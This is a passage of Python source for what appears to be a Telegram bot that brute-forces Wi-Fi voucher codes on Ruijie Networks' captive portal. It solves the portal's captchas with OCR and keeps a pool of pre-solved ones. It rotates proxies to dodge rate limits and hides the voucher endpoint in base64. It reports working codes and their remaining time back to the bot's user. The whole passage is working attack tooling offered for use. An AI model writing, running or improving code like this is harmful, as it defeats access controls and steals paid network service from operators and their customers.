    blur  = cv2.GaussianBlur(gray, (3, 3), 0)
    _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    k  = cv2.getStructuringElement(cv2.MORPH_RECT, (2, 2))
    th = cv2.morphologyEx(th, cv2.MORPH_CLOSE, k)
    _, bf = cv2.imencode('.png', th)
    result = _ocr.classification(bf.tobytes()).upper()
    del nparr, img, gray, kernel, blur, th, bf
    gc.collect()
    return result

async def Captcha_Text(image_bytes): return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(sess, session_id):
    headers = {'accept': 'image/*,*/*;q=0.8', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'}
    params = {'sessionId': session_id, '_t': str(time.time())}
    try:
        async with sess.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers, proxy=get_next_proxy_url()) as req: return await req.read()
    except Exception: return b""

async def Varify_Captcha(sess, session_id, text):
    headers = {'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'}
    try:
        async with sess.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json={'sessionId': session_id, 'authCode': text}, proxy=get_next_proxy_url()) as req:
            data = await req.json()
            return session_id if data.get("success") else None
    except Exception: return None

async def _solve_one_captcha(pool, session_url):
    try:
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=aiohttp.ClientTimeout(total=15)) as ts:
            sid = await get_session_id(ts, session_url)
            if not sid: return
            for _ in range(5):
                img  = await Captcha_Image(ts, sid)
                if not img: continue
                text = await Captcha_Text(img)
                if text and await Varify_Captcha(ts, sid, text):
                    try: pool.put_nowait((sid, text))
                    except asyncio.QueueFull: pass
                    return
    except Exception: pass

async def _fill_captcha_pool(pool, session_url, scan_id, chat_id):
    while True:
        cur = scan_tasks.get(chat_id)
        if not cur or cur.get("scan_id") != scan_id or cur.get("stop"): return
        needed = CAPTCHA_POOL_SIZE - pool.qsize()
        if needed > 0:
            tasks = [asyncio.create_task(_solve_one_captcha(pool, session_url)) for _ in range(min(needed, CAPTCHA_SOLVERS))]
            await asyncio.gather(*tasks, return_exceptions=True)
        else: await asyncio.sleep(0.05)

async def _solve_captcha_once(session_url):
    async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=aiohttp.ClientTimeout(total=20)) as ts:
        sid = await get_session_id(ts, session_url)
        if not sid: return None, None
        for _ in range(5):
            img  = await Captcha_Image(ts, sid)
            if not img: continue
            text = await Captcha_Text(img)
            if text and await Varify_Captcha(ts, sid, text): return sid, text
    return None, None

# ───────────────────────────────────────────────────────────
# Core voucher check
# ───────────────────────────────────────────────────────────
POST_URL = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
_VOUCHER_HEADERS = {"content-type": "application/json", "user-agent": "Mozilla/5.0 Chrome/139.0.0.0 Mobile Safari/537.36"}

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    if not recheck:
        cur = scan_tasks.get(chat_id)
        if not cur or cur.get("scan_id") != scan_id: return

    if recheck:
        session_id, auth_code = await _solve_captcha_once(session_url)
        if not session_id: return
    else:
        pool = _captcha_pool
        if pool is None: return
        try: session_id, auth_code = await asyncio.wait_for(pool.get(), timeout=8.0)
        except asyncio.TimeoutError: return None

    response = None
    try:
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=aiohttp.ClientTimeout(total=12)) as ts:
            async with ts.post(POST_URL, json={"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}, headers=_VOUCHER_HEADERS, proxy=get_next_proxy_url()) as req: response = await req.text()
    except Exception: return None

    if not response or 'request limited' in response: return None

    if 'logonUrl' in response:
        if recheck: return code
        expire_date, _ = await Code_Expires_Date(session_id)
        success_texts.setdefault(chat_id, []).append(f"🎫 {code}\n   {expire_date}")
        current = user_data.setdefault(chat_id, {}).get('current_display_codes', [])
        current.append(f"🎫 {code}\n   {expire_date}")
        code_line = "\n\n".join(current)
        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})

        if message:
            try:
                if chat_id not in success_messages or len(code_line) > 4000:
                    sent = await bot.send_message(message.chat.id, f"Success Codes:\n\n🎫 {code}\n   {expire_date}")
                    success_messages[chat_id] = sent.message_id
                    user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
                else:
                    await bot.edit_message_text(chat_id=message.chat.id, message_id=success_messages[chat_id], text=f"Success Codes:\n\n{code_line}")
                    user_data[chat_id]['current_display_codes'] = current
            except Exception: pass

    elif 'STA' in response:
        limited_texts.setdefault(chat_id, []).append(code)
        limited_line = "\n".join(limited_texts[chat_id])
        if message:
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(message.chat.id, f"Limited Codes:\n\n{limited_line}")
                    limited_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(message.chat.id, message_id=limited_messages[chat_id], text=f"Limited Codes:\n\n{limited_line}")
            except Exception: pass

# ───────────────────────────────────────────────────────────
# Expiry helper & Main Polling
# ───────────────────────────────────────────────────────────
def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown': return 'Unknown'
    try:
        mins = int(total_minutes)
        hours, rem_min = mins // 60, mins % 60
        return f"{hours}h {rem_min}m" if hours > 0 and rem_min > 0 else (f"{hours}h" if hours > 0 else f"{rem_min}m")
    except Exception: return 'Unknown'

async def Code_Expires_Date(active_id):
    url = f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{active_id}'
    headers = {'accept': 'application/json, text/javascript, */*; q=0.01', 'user-agent': 'Mozilla/5.0 Windows NT 10.0'}
    async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=aiohttp.ClientTimeout(total=10)) as fs:
        try:
            async with fs.get(url, headers=headers, proxy=get_next_proxy_url()) as req:
                if req.status == 200:
                    respond = await req.json()
                    if respond.get('success'):
                        result = respond.get('result', {})
                        raw_mins = result.get('totalMinutes') or result.get('remainingMinutes') or 'Unknown'
                        return f"📋 Plan: {result.get('profileName', 'Unknown')} | ⏳ Time: {Minute_to_Hour(raw_mins)}", raw_mins
        except Exception: pass
    return "📋 Plan: Unknown | ⏳ Time: Unknown", 'Unknown'

async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=45, request_timeout=55, interval=0)
            return
        except Exception as e:
            print(f"Polling reconnecting in {backoff}s... Error: {e}")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(limit=500, limit_per_host=100, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30), connector=_connector, connector_owner=False)
    
    await fetch_fresh_free_proxies()
    
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
